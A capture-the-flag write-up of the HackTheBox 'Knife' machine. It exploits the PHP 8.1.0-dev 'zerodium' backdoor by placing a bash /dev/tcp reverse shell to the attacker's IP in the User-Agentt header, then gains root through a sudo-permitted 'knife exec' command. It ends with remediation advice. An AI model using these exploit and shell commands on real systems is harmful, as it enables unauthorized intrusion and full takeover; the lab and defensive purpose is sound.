# Writeup

In this post we explore the Knife machine hosted on the HackTheBox website. We first scan the machine to enumerate the open ports and the respective running services.

### Analyze and Discovery

We start with an `nmap` enumeration. The `-sC` flag enables the usage of the default nmap scripts and the `-sV` flag enables the service and version discovery.

```
  [#] ~ nmap -sC -sV -oN nmap-initial 10.10.10.242

Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-05 09:49 CEST
Nmap scan report for 10.10.10.242
Host is up (0.024s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.26 seconds
```

Two ports results to be open: port 22 for the ssh service and 80 which hosts an Apache web service.

Visiting the webserver we land on the following page:

![](imgs/homepage.png)


The attack surface is very small as there aren't any input fields nor clickable links. The tabs on the top right of the page are not actually implemented.  

We can easily figure out that the website's backend language is PHP by noticing that the landing page is called `index.php`. This information may be useful in the future to tailor our enumeration/attacks.

We can gather further information on the resources hosted on the webserver by enumerating files or directories served on port 80. For this purpose, we can use `gobuster` and perform a dictionary-based brute force enumeration. 
As we know that the web server is written in php, it may contain files ending with `.php`. It may be useful to tell `gobuster` to also append the `.php` extension to the dictionary entries. The `-x` flag enables such feature.
The full `gobuster` command is 
```
gobuster dir -u http://10.10.10.242 -w SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php -t 50 -o gobuster-port80.txt
```

However the directory enumeration didn't return any valuable results. 

We can still examine the requests and responses generated when visiting the `index.php` page and see whether we can spot any anomalies. 

We open the Firefox developer tools and navigate to the `Network` tab. Here we can see the request sent by the browser to the server to request the `index.php` page and its respective response.

![](imgs/20210605-095915.png)

The `X-Powered-By` HTTP response header leaks the `PHP` version in use

![](imgs/20210605-100046.png)


Now that we know the specific version of php used, namely `php 8.1.0-dev`, we can google for known vulnerabilities.  
Our search produced a very interesting result:

![](imgs/20210605-100432.png)

It confirms that the current version is vulnerable and contains a backdoor that may cause remote code execution. What we need to do is finding this backdoor and exploit it.   

### Insight into the `PHP` backdoor

In exploitDB we can find the reference to the malicious commit that introduced the backdoor in the PHP code base. ([ExploitDB](https://www.exploit-db.com/exploits/49933)).

The backdoor is contained in the following code snippet:

![](imgs/20210605-101856.png)

As we can easily spot, the content of the `HTTP_USER_AGENTT` is scanned for the `zerodium` string. If the string is found, then the content after the first 8 bytes is evaluated.

So, if we build our `HTTP_USER_AGENTT` such that it starts with `zerodium` (8 bytes) than we will be able to execute the remaining bytes.

### Attacking and Tinkering

We know that the payload after the `zerodium` string will be executed in the server. Therefore we can embed a reverse shell to gain a shell in the remote machine.  
The server machine is running Ubuntu (as we can see from the `nmap` output), so we can use a simple tcp reverse shell that starts a connection to our local machine: `bash -i >& /dev/tcp/10.10.14.19/9001 0>&1`.  
(10.10.14.19 is the ip address of our local machine in the HTB network).


Indeed, we need to setup a tcp listener in our local machine to listen on port 9001 for the incoming connection. It can be done using netcat: `nc -lnvp 9001`.

The listener is ready, we can now trigger the backdoor.  
We embed our reverse shell into the `User-Agentt` header using BurpSuite.

![](imgs/20210605-102948.png)

And we get the callback

![](imgs/20210605-102850.png)


> An alternative to BurpSuite is the `curl` linux command. However, it would not be a very pleasant experience as one needs to pay close attention on escaping quotes.

We now have a shell as the **james** user. We can get the user flag by printing the `/home/james/user.txt` file.

#### Privilege Escalation

We can scan the machine for possible privilege escalation vectors.  

Before using any Linux enumeration scripts, we can try to see which commands the user **james** can execute as another user. It can be done using the `sudo -l` command.

![](imgs/20210605-103224.png)

As we can see from the command's output, we can execute the `knife` binary as root without the need to provide a password. 

But what is knife?

![](imgs/20210605-112124.png)

(More information on [Chef Documentation website](https://docs.chef.io/workstation/knife/) ) 

The documentation is indeed a useful resource to look at. It may be possible to find exploit vectors. 

As expected, going through the documentation highlighted an exploitable feature of the `knife` binary. It looks like we can execute arbitrary Ruby code:

![](imgs/20210605-105525.png)

Therefore we run the binary as **root** and spawn a shell using Ruby code.

```bash
james@knife:/$ sudo knife exec -E 'exec "/bin/bash"'
sudo knife exec -E 'exec "/bin/bash"'
$ whoami
root
```

We managed to get **root**, flag is in `/root/root.txt`

### Reflection on the security

In this section we highlight the security weaknesses that allowed us to get full control over the remote server. Moreover, we propose solutions to mitigate and patch such vulnerabilities

#### Security weaknesses and recommendations

- We managed to get a foothold in the target machine by exploiting an outdated version of PHP which contained a known backdoor. The vulnerability is extremely easy to exploit and allows an unauthenticated attacker to remotely gain access to the server's OS. Given the high impact and easiness of exploitation, the vulnerability can be classified as high risk and should be immediately patched.   
We advice to always keep the software up to date. Publicly facing web servers should have high priority and be updated daily as they are the first point of entry to the machine.

- The `X-Powered-By` leaks the PHP version in use, thus easily giving out extra information to the attacker. Such header should be immediately suppressed. Without the info about the PHP version the attacker would have had a harder time breaking into the machine. However security by obscurity is never a good solution and the problem should be fixed at the root (keep the software up to date).

- We managed to escalate our privileges by exploiting an over permissive rule in the `sudoers` file. Such rule allowed the `james` user to execute the `knife` binary as root without the need of a password. Such configuration together with the large variety of features exposed by the binary, easily allow an attacker to gain full control over the machine.
It is still unclear why the `sudoers` file contained such entry but it is definitely an over permissive rule which does not follow the minimality principle.  
It's highly likely that the system administrator lazily set up the `knife` sudo permissions without taking security into account.  
In case the **james** user is required to execute part of the `knife` features, we advice to configure the `sudoers` file in a more granular way, giving the users access to the required features only, and only after an accurate analysis of such features.  

